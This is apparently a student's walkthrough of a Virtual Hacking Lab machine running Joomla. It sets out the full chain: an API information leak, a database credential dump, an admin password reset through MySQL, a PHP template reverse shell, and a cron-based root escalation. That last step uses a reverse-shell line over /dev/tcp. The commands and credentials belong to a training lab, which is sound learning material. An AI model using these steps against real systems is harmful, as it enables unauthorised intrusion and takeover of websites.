# CMS101 - Virtual Hacking Lab

| Info          | Details                                   |
| ------------- | ----------------------------------------- |
| Platform      | Virtual Hacking Lab                       |
| Difficulty    | Advanced                                  |
| Target IP     | 10.11.1.178                               |
| OS            | Linux                                   |
| Vulnerability | Joomla Information Disclosure → Admin Access → RCE → Cron Privilege Escalation |
| Tools Used    | Nmap, Gobuster, Searchsploit              |

## Attack Path
1. Reconnaissance
2. Port Scanning (Nmap)
3. Web Enumeration
4. Joomla API Information Disclosure
5. Database Credential Leak
6. Admin Password Reset
7. Joomla Admin Access
8. Template PHP RCE
9. Initial Shell (apache)
10. Cron Job Privilege Escalation
11. Root Shell
12. Capture Flag

## Environment Setup

First, create a working directory and files to organize enumeration results.

```bash
mkdir cms101
cd cms101
mkdir nmap gobuster exploit
touch users.txt creds.txt
echo 'Testing....1...2...3...' > test.txt
```
## Network Scanning

Identify the target IP and perform a full port scan.

```bash
ip='10.11.1.178'
## Regular Scan + Version
sudo nmap -Pn -n $ip -sC -sV -p- --open -oN nmap/nmap.log
```

Reminder:
1. Check all the version
2. Check all the open ports

![RESULT](ss/1.png)

## FTP enumeration

Login with anonymous users

```bash
ftp $ip
anonymous::anonymous
```

![RESULT](ss/2.png)

anonymous user login failed

Check the version now, proftpd, but missing version 
## Web Enumeration

Web App page:

![RESULT](ss/3.png)

it seems like there's a login page. Before going further on web enumeration, start with directory searching

Directory brute forcing with Gobuster and dirsearch.

``` bash
# Gobuster
gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -o gobuster/dir.log -t 42

# dirsearch
dirsearch -u $ip
```

GoBuster: 

![RESULT](ss/4.png)

Dirsearch:

![RESULT](ss/5.png)

```bash
# Interesting directory
/administrator - Joomla (No version showed)
/robots.txt 
/tmp - Blank Page
/web-config.txt - no useful information
```

/robots.txt: most of the directory shows blank pages

![RESULT](ss/6.png)

/administrator:

![RESULT](ss/7.png)

While searching for joomla website for RCE, found a website similar to this lab
# Public Exploit
```bash
https://www.vulncheck.com/blog/joomla-for-rce

curl -v http://10.11.1.178/api/index.php/v1/config/application?public=true
```

![RESULT](ss/8.png)

```bash
mysql -h $ip -u joomla --skip-ssl -p
PasSw0RdjO0ml4

show databases;
use joomla;
show tables;
SELECT username, password FROM eqa2g_users;
```

![RESULT](ss/9.png)

Now follow the website changed the password in mysql

```bash
Update eqa2g_users
SET PASSWORD = MD5("IamHacker123")
WHERE id = 913;
```

![RESULT](ss/10.png)

![RESULT](ss/11.png)

Now back to Joomla admin page

```bash
joomlaadmin::IamHacker123
```

![RESULT](ss/12.png)

Navigate to System > Site Templates > Cassiopeia Details and Files> index.php

![RESULT](ss/13.png)

Now edit the file to petestMonkey php code, and oopen a listener. Then navigate to index.php to trigger the rce code.

```bash
sudo nc -lnvp 4444
```

![RESULT](ss/14.png)

Successful got the remote shell, run as apache
## Linux Privilege Escalation
```bash
#try weak password 
cat /etc/crontab
```

![RESULT](ss/15.png)

Results shows root running every 5 mins for backup.sh

```bash
cat /usr/local/bin/backup.sh
```

![RESULT](ss/16.png)

Since I am the user of apache and do have the write permission in `/var/www/html/administrator`

```bash
cd /var/www/html/administrator

# create a malicious tar binary code
echo 'bash -c "bash -i >& /dev/tcp/172.16.1.2/1111 0>&1"' > tar
```

Open another terminal for nc listener

```bash
sudo nc -lnvp 1111
```

Success received a root web shell

```bash
whoami
id
cat /root/key.txt
```

![RESULT](ss/17.png)

